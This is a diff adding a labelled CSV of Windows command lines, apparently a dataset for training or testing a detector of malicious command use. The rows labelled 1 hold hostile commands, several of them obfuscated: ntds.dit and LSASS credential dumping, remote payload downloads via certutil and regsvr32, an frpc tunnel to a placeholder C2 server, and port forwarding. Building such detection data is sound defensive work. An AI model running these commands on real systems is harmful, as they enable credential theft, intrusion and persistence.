@@ -1,0 +1,357 @@
+"Command","Label"
+"dEL""C:\uSerS\FEISey.LOg""/F	/q","0"
+"fsutil.exefilelayout		""D:\ProgramFiles\Users\pmqclhoxx.dat""","0"
+"CSi.exe	{pATH:.cS}","1"
+"%WINDIR%\NTDS\ntds.dit' to
+'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
+opy1\Windows\NTDS\ntds.dit'","1"
+"attrib.exe+h		""D:\Users\Logs\pbqalhsp.txt""","0"
+"priNTbrM	-b-D{path_smb:FOLDEr}-f{pATh_aBsoLUTe:.ZIp}","1"
+"scHtasks /cReaTE /Tn ""mY daiLY BacKuP"" ""/tR"" ""cOpY ""\""d:\winDOWS\Logs\IxOExY.dAt\"""" \""c:\apPdAta\teMp\KIbNbOFAub.exe\"""" /Sc ""dAIly"" /ST 23:00","0"
+"net.exe	userjcmjdlxq	/add","0"
+"COPY	""c:\uSers\wINDOwS\gcagIQtkh.log""""c:\AppdatA\OqivDtzveL.exe""","0"
+"FSUTiL filE ""LaYout"" ""d:\windows\pROGrAm filES\yMkuQ.dat""","0"
+"CmD.exe"" /C wMIC.exe PROcesS CAlL crEatE ""Cmd.exe /c MkDIr C:\WINDoWS\temP\mcAFee_LOGS & NtDSUTIL.exe \""ac I nTDS\"" iFM \""CreatE Full C:\WINDoWS\tEMP\mCAfee_LOgs\","1"
+"RMdir.exe""d:\ProGrAmFiLeS\prOGraMfIles""	/S	/Q","0"
+"xCopy.exe	.\TOc*.ymL	..\..\COPy-to\/s/y
+reMOuTpuTExAmPLe.
+reM.\D1\toc.YML
+rEm.\d1\D12\Toc.ymL
+ReM.\d2\Toc.YML
+ReM3fILE(s)cOPiED","0"
+"pr\u006Fcdump.exe -md {PATH:.dll} foobar","1"
+"""odbcconf"" ""/a"" {REGSVR {PATH_ABSOLUTE:.dll}}","1"
+"pOWeRShelL -cOMmAnd ""gEt-cHiLDitEm -PAtH d:\wINDoWS\lOGS -reCurSe | SELECT-object FullnAmE, LEnGtH""","0"
+"xcopy.exe \customer ""h:\public\address"" /s /e ""/k"" /p /i","0"
+"atTRiB +H ""C:\APpdAtA\LOGs\kbuLk.dll""","0"
+"rundll32 c:\windows\syst\u0065m32\comsvcs.dll minidump {ls""+""ass_pid} dump.bin full","1"
+"volumec:	AliASSYsTEm1	GuId\\?\VoLume{XXxXXxxX-xxxX-xxxx-XXxx-XxXxxXxxxxXx}\","0"
+"RUnExehELPer%pAtHEXT:~0,4% {pATh_abSOLUtE:.exe}","1"
+"ping 192.168.100.48","0"
+"GPscriPT /lOG\u006Fn","1"
+"TFtP.exe  ""-I"" HosT1 GeT ""bOOT.IMG""","0"
+"""attrib.exe"" ""+h"" ""D:\Users\Logs\pbqalhsp.txt""","0"
+"tAsKlisT.exe /V","0"
+"pcalua%PATHEXT:~0,4%	-a	{PATH:.exe}","1"
+"eventcreate.exe /s server /u user /id 100 /t WARNING ""/d"" ""Remote ""machine"" ""with"" partial user credentials""","0"
+"lbpolicy set ""lun"" type=^^<type^^> ""[paths=^^<path^^>-{primary"" ^^| ""^^<weight^^>}[,^^<path^^>-{primary"" ^^| ^^<weight^^>}[,…]]]","0"
+"FTyPe.exe TXtfILe /asSoC.exe .pL=pERLSCrIPT
+FTYPE.exe perlScrIpt=peRl.exe %1 %*/SeT pAtHEXT=.pl;%pAtheXT%","0"
+"schtasks/create/tn""MyDailyBackup""	/tr""copy\""D:\Windows\Logs\ixoexy.dat\""\""C:\AppData\Temp\kibnbofaub.exe\""""/scdaily/st23:00","0"
+"EVNtCMD.exe[/s<COMPuTErnAmE>][/V<verBosItYLevel>]	[/n]<filenamE>","0"
+"""IcacLs.exe"" ""d:\UsErs\zLwSfh\piCTUReS\PICTUREs\gsTxLJWuyu.sYS"" ""/grant"" EVERYonE:f","0"
+"xsd.exe	{REMOTEURL}","1"
+"rundll32 advpack.dll, RegisterOCX {%COMSPEC:~-7,-4%%PATHEXT:~0,4%}","1"
+"schtasks/create/tn""MyDailyBackup""/tr""copy.exe	\""C:\AppData\Users\yrzvcgu.log\""\""C:\AppData\mhioe.sys\""""/scdaily/st23:00","0"
+"rundll32.exe	ieadvpack.dll,LaunchINFSection{PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,","1"
+"procdump.exe -md {PATH:.dll} foobar","1"
+"AssIgN E:","0"
+"""move.exe"" ""C:\Users\Users\scfyzqjn.sys"" ""D:\Logs\Program Files\wwnigyxt.ini""","0"
+"@Echo ofF
+REm  tHIs BatCH ""PROgraM"" forMatS AND cHEcks NEW diSks.
+rem  it is ""NaMeD"" chECKNeW.bat.
+REm
+reM ecHo INSErT NEW dISK IN driVE B.
+pausE
+forMaT B: /v ChKDsK B:","0"
+"Get-EventL\u006Fg security -instanceid 4624 | Where-
+Object {$_.message.contains('{redacted user
+account}')} | select -First 1 | fl","1"
+"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 ""0"" 0 0 0 0"" /launch ""{PATH:.exe}""","1"
+"ysoserial%PATHEXT:~0,4% -o ""raw"" -f BinaryFormatter - g DataSet -c ""{CMD}"" ^^> RecentViews ""^^&"" copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews ^^& eventvwr.exe","1"
+"ceRtoc.exe	-LoadDlL{PAtH_ABsOlUte:.dll}","1"
+"SET""SYStemrOOT=c:\WindOwS\tEmp""		&&cmd/CDEsKToPiMgDOwnlDR.exe/lOCKscreeNuRL:{rEmoTEuRL}/eVenTnaME:DeSkTOPimgdoWNLDr","1"
+"NTdSUTiL%pATheXt:~0,4% ""Ac I NTds"" ""IFm"" ""CReaTE fuLl ""C:\"""" q q","1"
+"nET.exe use z: \\192.168.85.155\dATA","0"
+"regsvr32.exe ""/u"" /s {PATH:.dll}","1"
+"WFMFormat.exe","1"
+"ntsd.exe	-g	{CMD}","1"
+"""fsutil.exe""	filelayout	""D:\Windows\AppData\yhmpp.ini""","0"
+"""dir.exe"" ""C:\Windows\Users"" ""/s"" ""/b""","0"
+"dotnet%PATHEXT:~0,4% {PATH:.dll}","1"
+"DIr.exe	C:\ProgramFiLES","0"
+"E:\WINdoWS\rmdIr.exe ""c:\AppdaTA\PrOGram ""FIlEs"""" /S /q","0"
+"NeT.exe usE Z: \\192.168.85.155\dAtA","0"
+"""rundll32""	""AdVpAcK.dll,""	REGIsteRocX{CmD.exe}","1"
+"WFMFormat%PATHEXT:~0,4%","1"
+"evntcmd.exe [/s ^^<computername^^>] [/v ^^<verbositylevel^^>] ""[/n]"" ""^^<filename^^>""","0"
+"SC ""qUerY"" ^^| FiNDsTr ""SErvIcE_NaME""","0"
+"rmdir.exe""D:\ProgramFiles\Program	""Files""""""/s""/q","0"
+"start /b %COMSPEC:~-7,-4% /c ""winget%PATHEXT:~0,4% install --accept-package-agreements -s msstore {name or ID}""","1"
+"ping	192.168.100.48","0"
+"ruNdLl32%pAthext:~0,4% zIPfldR.dll,rOUtETHeCaLL FIlE://^C^:^/^w^I^N^d^O^w^S^/^S^Y^S^t^e^M^3^2^/^c^a^L^c^.^e^x^e","1"
+"start /b cmd /c ""rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}""","1"
+"call CsI.exe {PaTh:.cS}","1"
+"""AttrIb"" +h ""D:\TemP\vMFpS.LoG""","0"
+"CALl TAr -xF {PAtH}:Ads","1"
+"move.exe ""D:\Windows\Windows\zpvpfjevox.txt"" ""C:\Logs\Program Files\zaypag.log""","0"
+"reset%PATHEXT:~0,4% session","1"
+"nTdsutiL.exeSnApsHoT	“actIvATeInsTANcENtdS”
+CReatE	QuiTQuIt","0"
+"""net.exe"" ""user"" jcmjdlxq ""/add""","0"
+"fsutil%PATHEXT:~0,4% trace decode","1"
+". ""%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1""   \nSyncInvoke {CMD}","1"
+"DumpMinitool%PATHEXT:~0,4% --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full","1"
+"upDAte%PatHEXt:~0,4% --Update={rEmOtEurL}","1"
+"Sqlps.exe -noprofile","1"
+"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}","1"
+"sEt ""SYsTEMroot=C:\WinDows\TeMP"" ^^&^^& ""cmD"" /C DEskTOpiMGdOwnLDR.exe /LOcksCREenUrL:{reMoTEurL} /evEnTnaMe:DesktOPIMGdoWnldr","1"
+"eVNtCMD.exe [/S <COMPUternAmE>] [/v <VeRbOSItYLevEL>] [/n] <fiLeNaME>","0"
+"""scHTaSKS"" /creAte /TN ""mY dAily BAcKuP"" /Tr ""cOPy.exe ""\""D:\wiNDOwS\temp\ibzHAn.INI\"""" \""c:\aPPDATA\mooJqtUczZ.loG\"""" /Sc daIly /st 23:00","0"
+"wmic.exe process call ""create"" ""cmd.exe /c mkdir \\?\C:\Windows\..\Windows\Temp\tmp ^^& ntdsutil.exe \""ac i ntds\"" ""ifm"" ""\""create"" full \\?\C:\Windows\..\Windows\Temp\tmp\","1"
+"dEL	""d:\TEmp\WsrRPj.tXT""	/f/Q","0"
+"start/bcmd/c""#EstablishesaTCPtunnel	totheattacker'sserver
+frpctcp-s<C2_SERVER_IP>:<PORT>-t<AUTH_TOKEN>--ue--uc-l<LOCAL_PORT>	-r<REMOTE_PORT>""","1"
+"eVENtcREaTe.exe [/s <CompUTER> [/U <doMain\uSer> [/P <passWOrd>]] {[/l {APPlicATion|SYSTEM}]|[/SO <SRcNaMe>]} /T {eRROR|wArNInG|iNFoRmaTIon|SuCcESsAuDIt|FaILuReAUdit} /ID <EVeNTId> /d <DESCriPTiOn>","0"
+"CMD.exe /Q /C *DIr.exe 1> \\127.0.0.1\adMIN$\__1684956600.123456 2>&1","1"
+"deL ""D:\aPPdaTa\PROGRaM FiLES\dvRrB.SYs"" /F /q","0"
+"arp.exe	-a","0"
+"""start"" /b cmd ""/c"" ""scanline.exe ""-t"" 192.168.1.0/24 -p 1-65535""","1"
+"""Tftp.exe""  -i ""HOst1"" ""gET"" boOt.img","0"
+"fsutil.exe ""file"" ""layout"" ""D:\AppData\iiiba.ini""","0"
+"set windir=c:\test& cd ""c:\program files\internet explorer\"" & iediagc""+""md.e""+""xe /out:{path_absolute:.cab}","1"
+"C:\Windows\net.exelocalgroup	""Administrators""""ioobthxs""	""/add""","0"
+"""net.exe"" user ysiaijxj /add","0"
+"ac i ntds i","1"
+"pING	192.168.188.166","0"
+"del""C:\AppData\Temp\vfshvppret.sys""		/f/q","0"
+"tasklist.exe	/v","0"
+"type.exe	""C:\Program	Files\Logs\ntkyac.txt""","0"
+"powershell-Command""Get-ChildItem-PathC:\Logs\Windows-Recurse|Select-ObjectFullName,	Length""","0"
+"C:\wINDows\rmdiR.exe""C:\USerS\DrAuhapg\doWNLOads""/s	/Q","0"
+".%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1	\nSyncInvoke{CMD}","1"
+"cReatE luN sImPlE [siZe=<N>] [DriVes=<n>] [nOErR]
+create luN STrIPe [SiZE=<n>] [DriVES=<N, N> [,...]]  [StRipESIZe=<n>] [nOERr]
+creATe LUN RaID [SIZE=<n>] [dRIvEs=<n, N> [,...]] [StrIpesize=<N>] [NoERR]
+crEate lUN miRrOr [SizE=<N>] [DrIVes=<n, n> [,...]] [STriPEsIZE=<N>] [noERR]
+CrEaTe lUN aUtOmaGic siZe=<N> [nOERr]
+CREatE targeT naMe=<NamE> [IscsINAmE=<iScsInAME>] [noeRR]
+CreatE TpgROUP [NoeRr]","0"
+"dotnet.exe fsi","1"
+"start /b cmd /c ""AppVLP.exe powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""base64_here"")).exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""""","1"
+"cmd.exe /c ""arp.exe -a
+curl.exe www.ip-api[.]com
+dnscmd.exe . /enumrecords /zone {REDACTED}
+dnscmd.exe . /enumzones
+dnscmd.exe /enumrecords {REDACTED} . /additional
+ipconfig.exe /all
+ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
+net.exe localgroup administrators
+net.exe group /dom net.exe group ""Domain Admins"" /dom
+netsh.exe interface firewall show all
+netsh.exe interface portproxy show all
+netsh.exe interface portproxy show v4tov4
+netsh.exe firewall show all
+netsh.exe portproxy show v4tov4
+netstat.exe -ano
+reg.exe query hklm\software\
+systeminfo.exe
+tasklist.exe /v
+whoami.exe
+wmic.exe volume list brief
+wmic.exe service brief
+wmic.exe product list brief
+wmic.exe baseboard list full
+wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]""","1"
+"WeCUtil.exe sS SUB1 /c:%wiNDiR%sYstem32wsSeLrG2.xmL","0"
+"icacls.exe	""C:\Temp\AppData\bhylv.sys""""/grant""	""Everyone:F""","0"
+"""d\u0069antz"" ""/f"" ""{PATH:.ddf}""","1"
+"dtrace.exe[-BCeFhlqSvVwYZ][-bbufsz][-ccmd][-Dname[=def]][-Ipath]
+[-Lpath][-ooutput][-ppid][-sscript][-Uname][-xopt[=val]][-Xa|c|s|t]
+[-ysymbolpath]
+[-Pprovider[[predicate]action]][-m	[provider:]
+module[[predicate]action]][-f[[provider:]module:]
+func[[predicate]action]][-n[[[provider:]module:]func:]
+name[[predicate]action]][-iprobe-id[[	predicate]action]][args...]","0"
+"Ldifde -i -f {PATH:.ldf}","1"
+"regsvr32	/s/n/u/i:{REMOTEURL:.sct}scrobj.dll","1"
+"FindStr /V /L w3alll\U006FV3loLBAs {path_SmB:.exe} > {paTh_AbSolute}:FiLE.exe","1"
+"piNg	192.168.188.166","0"
+"""cmd.exe /c netsh interface portproxy ""add"" v4tov4 ""listenport=50100"" listenaddress=0.0.0.0 connectport=1433 connectaddress=""","1"
+"cALL tTdInjEcT.exe /CLientScEnarIO TTDREcoRdEr /ddlOAd 0 /ClIENTPARAMs ""7 TmP.rUn 0 0 0 0 0 0 0 0 0 0"" /LAUnCh ""{PAth:.exe}""","1"
+"Sqlps%PATHEXT:~0,4% -noprofile","1"
+"%COMSPEC:~-7,-4%%PATHEXT:~0,4%	/Q/c*dir.exe1>	\\127.0.0.1\ADMIN$\__1684956600.1234562>&1","1"
+"move.exe""D:\Windows\Windows\zpvpfjevox.txt""""C:\Logs\Program	Files\zaypag.log""","0"
+"""NeTstat.exe"" ""-s"" -p TcP ""Udp""","0"
+"cmd.exe /c """"cmd.exe /c netsh interf\u0061ce portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""""","1"
+"ftp/getmac.exe/ssrvmain/umaindom\hiropln/pp@ssW23		/fotable/nh","0"
+"attributesvolume[{set^^|clear}][{hidden^^|""readonly""""^^|""nodefaultdriveletter^^|shadowcopy}]	[noerr]","0"
+"findstr/C:""LdM79jy9uwpQ""	""C:\Windows\rvgnpptq.dat""","0"
+"certoc.exe-LoadDLL	{PATH_ABSOLUTE:.dll}","1"
+"wmic.exe process ""list"" brief","0"
+"prINTBrM -b -d {pAtH_SMb:foldEr} -F {PaTH_aBsOLUtE:.zip}","1"
+"arp.exe -A","0"
+"Type	""C:\WiNDOwS\WIndOWS\GsqGxfLAo.exe""","0"
+"C:\Windows\System32\mkdir.exe	""D:\Users\anmoqxs\Documents\Downloads""","0"
+"# Establishes a TCP tunnel to the attacker's server
+frpc tcp -s <C2_SERVER_IP>:<PORT> -t <AUTH_TOKEN> --ue --uc -l <LOCAL_PORT> -r <REMOTE_PORT>","1"
+"pOweRSHELl -COmmAnd ""get-ChIlDitEM -PatH C:\LOGs\WINDoWs ""-RecURSe"" ^^| ""SeLECt-oBJECT"" ""FulLnAME,"" lEngtH""","0"
+"ScHTAskS /creatE /tn ""MY DaIlY BACkUp"" /tR ""copy \""c:\WiNdOWS\LOGS\uNifKBHWFK.SYs\"" \""d:\USErS\PrOGRaM Files\EgEfy.SyS\"""" /sc daIly /sT 23:00","0"
+"net.exe use Z: ""\\192.168.85.155\data""","0"
+"fsutil.exetrace		decode","1"
+"C:\Windows\Temp\tmp\Active	Directory\ntds.dit","1"
+"C:\winDOwS\TEMp\tMP\AcTivE	diRectORY\nTdS.DIt","1"
+"c""+""md.e""+""xe /c netsh.exe interface portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=","1"
+"ntdsutil.exe snapshot “activate instance ""ntds”
+create"" ""quit"" quit","0"
+"fsUTIl.exe	File	lAyouT""d:\ApPDatA\iIIba.InI""","0"
+"rundll32 advpack.dll, RegisterOCX {%COMSPEC:~-7,-4%%PATHEXT:~0,4%}","1"
+"""rUNdLl32.exe"" ""aDvpaCK.dll,REgISTeROCx"" ""{PATh:.exe}""","1"
+"net.exe use ""Z:"" ""\\192.168.89.163\public""","0"
+"fsutIL.exe trAcE dECOdE","1"
+"""net"" ""use"" Z: ""\\192.168.152.165\data""","0"
+"tYpE ""C:\wINdOws\WindOWS\GSqgxflAO.exe""","0"
+"APPVLP%paTHExT:~0,4% {Path_SMb:.bat}","1"
+"winget.exe install --manifest {PATH:.yml}","1"
+"FtP/geTmAc.exe/ssrvMaIN/U	MaiNdoM\hiroPln/Pp@sSW23/fOtaBLe/nh","0"
+"winget%PATHEXT:~0,4%install--accept-package-agreements-s	msstore{nameorID}","1"
+"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:68.0)               Gecko/20100101 Firefox/68.0","1"
+"echo.exe%DATE%%TIME%	^^>^^>""C:\Users\jofu\Desktop\sjinnszs.dll""","0"
+"tYpE ""c:\WinDoWs\WINdOWS\gsqGXflAo.exe""","0"
+"atTRib+H	""D:\TEmp\VMFpS.lOG""","0"
+"MOZillA/5.0 (WINDOwS nt 6.1; woW64; Rv:68.0)   """"         """"   GecKo/20100101 fIreFOx/68.0","1"
+"print/D:{PATH_ABSOLUTE:.dest.exe}	{PATH_SMB:.source.exe}","1"
+"cmd.exe /c ""winget.exe install --accept-package-agreements -s msstore {name or ID}""","1"
+"evNTcmD.exe [/S <cOmpUtERnAme>] [/V <vErBoSItyLeVeL>] [/N] <FilENAme>","0"
+"%WINDIR%\Temp\tmp\Act\u0069ve	Directory\ntds.dit","1"
+"call echo GetObject(""script:{REMOTEURL:.js}"") > {PATH_ABSOLUTE}:hi.js && wscript.exe {PATH_ABSOLUTE}:hi.js","1"
+"ftp/getmac.exe/ssrvmain/u		maindom\hiropln/pp@ssW23/fotable/nh","0"
+"wscript//e:vbscript		{PATH}:script.vbs","1"
+"#Establishes	aTCPtunneltotheattacker'sserver
+frpctcp-s<C2_SERVER_IP>:<PORT>-t<AUTH_TOKEN>--ue--uc-l<LOCAL_PORT>-r<REMOTE_PORT>","1"
+"eventcreate.exe /s server /u user /id 100 /t WARNING /d ""Remote machine ""with"" ""partial"" user credentials""","0"
+"reg.exe	export	HKLM\SOFTWARE\Microsoft\Evilreg{PATH_ABSOLUTE}:evilreg.reg","1"
+"wMiC.exe ""proCEss"" call CrEAtE ""CMd.exe ""/C"" MkDiR c:\wINdows\..\wINdoWS\TeMP\tmp ^^& NtdsUTIL.exe \""Ac I Ntds\"" ifM \""cReate fUlL C:\wiNdoWS\..\WIndoWS\tEMp\tmp\","1"
+"Excel.exe {REMOTEURL}","1"
+"eChO.exe %DaTe% ""%tIMe%"" ""^^>^^>"" ""D:\Logs\users\DeItFg.txT""","0"
+"del""C:\AppData\Temp\vfshvppret.sys""		/f/q","0"
+"ttdinject%PATHEXT:~0,4% /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /launch ""{PATH:.exe}""","1"
+"call ""xwizard"" ""RunWizard"" ""{00000001-0000-0000-0000-0000FEEDACDC}""","1"
+"netstat.exe -an","0"
+"nET ""user"" ""dXpQuPDk"" /AdD","0"
+"""del"" ""D:\Temp\wsrrpj.txt"" ""/f"" /q","0"
+"ceRtuTIl.exe		-urL{reMOTeURl:.exe}","1"
+"start /b cmd /c ""s\u0065t ""SYSTEMROOT=C:\Windows\Temp"" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr""","1"
+"AtTRIb	+h""c:\APPdAtA\loGS\kBuLK.dll""","0"
+"pcalua.exe -a {PATH:.exe}","1"
+"""fsutil.exe""	file""layout""	""D:\Windows\AppData\yhmpp.ini""","0"
+"FsUTiL.exe	FILElaYOut""d:\prOgrAMfIlEs\USers\PMqclhoXX.dAt""","0"
+"fsutil%PATHEXT:~0,4% trace decode","1"
+"IPConfig.exe	/AlL","0"
+"COrEgEn.exe	dUMMY_aSseMBly_NamE","1"
+"SqLDUmpER.exe 540 0 0X01100:40","1"
+"tar -xf {PATH}:ads","1"
+"forfiles /p c:\windows\system32 /m notepad.exe /c ""{CMD}""","1"
+"cerTUtiL.exe -hashfiLE ""C:\PrOgrAM FILeS\apPDATa\sOfSTW.TXT"" sHa256","0"
+"winget.exe install ""--manifest"" ""{PATH:.yml}""","1"
+"""C\u006FnfigSecurityPolicy.exe"" ""{PATH_ABSOLUTE}"" ""{REMOTEURL}""","1"
+"xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}","1"
+"C:\WINdOws\sYSTEM32\MkdiR.exe	""D:\USErs\ANMoqXs\docuMentS\dOwnLOAdS""","0"
+"attrib.exe	+h	""D:\Users\Logs\pbqalhsp.txt""","0"
+"sC ""QUeRY"" ""^^|"" ""FInDsTR"" ""SeRVICe_namE""","0"
+"netstat.exe ""-s"" ""-p"" ""tcp"" udp","0"
+"wt%PATHEXT:~0,4% {CMD}","1"
+"powershell.exe ""-Command"" ""Get-Service""","0"
+"wmic.\u0065xeprocesscallcreate""cmd.exe/cmkdirC:\Windows\..\Windows\Temp\tmp&ntdsutil.exe\""acintds\""	ifm\""create	fullC:\Windows\..\Windows\Temp\tmp\","1"
+"c:\WIndows\sYsTeM32\IME\ShAred\iMEWDBLd.exe {REmOteurl}","1"
+"cmd.\u0065xe/Q/cwmicprocesscallcreate""cmd.exe/cmkdirC:\Windows\..\Windows\Temp\tmp&ntdsutil\""acintds\""ifm	\""createfullC:\Windows\..\Windows\Temp\tmp\""	1>\\127.0.0.1\ADMIN$\2>&1","1"
+"call xsd%PATHEXT:~0,4% {REMOTEURL}","1"
+"Net.exeUSErofZPdCbB	/adD","0"
+"call %WINDIR%\..\Windows\Temp\tmp\Active Directory\ntds.dit","1"
+"wab.exe","1"
+"mpcMdrun%patHexT:~0,4% -DownLOadFIlE -uRl {RemOTeurl:.exe} -patH {PatH_aBSoLUTe:.exe}:evIL.exe","1"
+"Sqlps%PATHEXT:~0,4% -n\u006Fprofile","1"
+"net.exeuse	Z:\\192.168.43.104\public","0"
+"Get-EventLog security -instanceid 4624 -after
+{redacted date} | fl * | Out-File
+'C:\users\public\documents\user.dat'","1"
+"TYpe.exe""C:\prOGrAm	FiLeS\LoGS\ntKYAc.TxT""","0"
+"""FTP/gpREsULt.exe"" /s ""SRVMAiN"" /U MaINDOm\hIRoPLN /P ""p@sSw23"" /r","0"
+"""wmic.exe"" process ""list"" ""brief""","0"
+"iPcoNFiG.exe	/AlL","0"
+"ysoserial.exe -o raw -f binaryformatter - g dataset -c ""{cmd}"" > recentviews & co%PATH:~0,0%py recentviews %localappdata%\microsoft\eventv~1\recentviews & eventvwr.exe","1"
+"cmd.exe /Q /c wmic ""process"" call create ""cmd.exe /c mkdir \\?\C:\Windows\..\Windows\Temp\tmp ^^& ""ntdsutil"" \""ac i ntds\"" ifm \""create ""full"" \\?\C:\Windows\..\Windows\Temp\tmp\"" 1^^> \\127.0.0.1\ADMIN$\ 2^^>^^&1","1"
+"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","1"
+"wmIc.exepRoceSS	LISt	BRIEF","0"
+"OfflineScannerShell","1"
+"nET uSE Z: ""\\192.168.180.5\pUbliC""","0"
+"$DCs = Get-ADDomainController -Filter /$startDate = (get-date).AddDays(-1)/foreach ($DC in $DCs){
+$slogonevents = Get-Eventlog -LogName
+Security -ComputerName $DC.Hostname -
+after $startDate | where {$_.eventID -eq
+4624 }}/foreach ($e in $slogonevents){
+# Logon Successful Events
+# Local (Logon Type 2)
+if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 2)){
+write-host ""Type: Local Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+}/if (($e.EventID -eq 4624 ) -and
+($e.ReplacementStrings[8] -eq 10)){
+write-host ""Type: Remote Logon`tDate:
+""$e.TimeGenerated ""`tStatus:
+Success`tUser: ""$e.ReplacementStrings[5]
+""`tWorkstation: ""$e.ReplacementStrings[11]
+""`tIP Address: ""$e.ReplacementStrings[18]
+}}","1"
+"net.exe	user	ysiaijxj/add","0"
+"certoc.exe		-LoadDLL{PATH_ABSOLUTE:.dll}","1"
+"""fsutil"" devdrv query ""[^^<volume"" path^^>]","0"
+"neT.exeUseR	aXEYISFx	/aDD","0"
+"ECHO.exe%DaTE%	%tIME%>>""c:\users\Jofu\desKtOP\SjInnSzS.dll""","0"
+"rdrl\u0065akdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1","1"
+"certoc.exe -LoadDLL {PATH_ABSOLUTE:.dll}","1"
+"fc /A [/c] [/L] [/Lb<n>] [/N] [/oFF[Line]] [/t] [/U] [/w] [/<NNnn>] [<DRIVE1>:][<paTH1>]<fiLenAmE1> [<dRiVe2>:][<PAth2>]<filEnamE2>","0"
+"appvlp.exe power""+""shell.exe -c ""$e=new-object -comobject shell.\u0061pplication;$e.shellexecute('{path:.exe}','', '', 'open', 1)""","1"
+"OfflineScannerShell","1"
+"set ""SYSTEMROOT=%WINDIR%\Temp"" && %COMSPEC:~-7,-4% /c desktopimgdownldr%PATHEXT:~0,4% /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr","1"
+"Mozilla/5.0(WindowsNT6.1;WOW64;rv:68.0)	Gecko/20100101Firefox/68.0","1"
+"""ntsd%PATHEXT:~0,4%"" ""-g"" ""{CMD}""","1"
+"wab%PATHEXT:~0,4%","1"
+"icacls.exe	""C:\Temp\AppData\bhylv.sys""""/grant""""Everyone:F""","0"
+"Get-EventLogsecurity-instanceid""4624""^^|Where-
+Object""{$_.message.contains('{redacted""	user
+account}')}^^|select-First1^^|fl","1"
+"schtasks/create/tn""MyDailyBackup""/tr""copy.exe\""D:\Windows\Temp\ibzhan.ini\""""\""C:\AppData\moojqtuczz.log\""""""/scdaily		/st23:00","0"
+"$DCs=Get-ADDomainController-Filter/$startDate=(get-date).AddDays(-1)/foreach($DCin$DCs){
+$slogonevents=Get-Eventlog-LogName
+Security-ComputerName$DC.Hostname-
+after$startDate""^^|""where{$_.eventID-eq
+4624}}/foreach($ein$slogonevents){
+#LogonSuccessfulEvents
+#Local(LogonType2)
+if(($e.EventID-eq4624)-and
+($e.ReplacementStrings[8]-eq2)){
+write-host""Type:""Local""Logon`tDate:
+""$e.TimeGenerated""`tStatus:
+Success`tUser:""$e.ReplacementStrings[5]
+""`tWorkstation:""$e.ReplacementStrings[11]
+}/if(($e.EventID""-eq""4624)-and
+($e.ReplacementStrings[8]-eq10)){
+write-host""Type:RemoteLogon`tDate:
+""$e.TimeGenerated""`tStatus:
+Success`tUser:""$e.ReplacementStrings[5]
+""`tWorkstation:	""$e.ReplacementStrings[11]
+""`tIPAddress:""$e.ReplacementStrings[18]
+}}","1"
+"aRp.exe -a","0"
+"FsUTILdeVdrv	QUerY	[<volumePaTH>]","0"
+"@EcHo OfF
+rem  thIs bAtCh prOgrAM FORmaTs and checKs NeW diskS.
+REM  iT iS nAmeD checKNeW.bat.
+rem
+rem ECHo inSERt NEw diSk In driVE b.
+PaUSE
+forMaT b: /v CHkDsk B:","0"
+"wscript //e:vbscript {PATH}:script.vbs","1"
+"rmDIr.exe""d:\prOGRamFilEs\PrOGRaM	FIlEs""	/S/Q","0"
+"cscRIpT.exeprnDRVR-a-MLaserpriNTERmodEL1-v3-E	WINDOWSx64-iC:\temp\lASERPrinter1.Inf-Hc:\tEmp","0"
+"C:\WinDowS\sYsTEM32\powershell.exe-COmMAnd	""GET-cHiLDITEM-pAThC:\USeRs\RsycvqF\downLOAdS-reCURSE|SElECt-oBJectfULLnaME,lEnGTH""","0"
+"dxcaP.exe		-C{pAth_aBsolUte:.exe}","1"
+"ceRTutiL.exe -Url {REMoteuRL:.exe}","1"
+"C:\Windows\System32\powershell.exe -Command ""Get-ChildItem -Path ""C:\Users\rsycvqf\Downloads"" -Recurse ^^| Select-Object FullName, Length""","0"
+"""net"" ""localgroup"" Administrators pgwnooqy ""/add""","0"
+"evntcmd.exe[/s<computername>][/v<verbositylevel>]	[/n]<filename>","0"
+"rundll32.exe url.dll,FileProtocolHandler file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e","1"
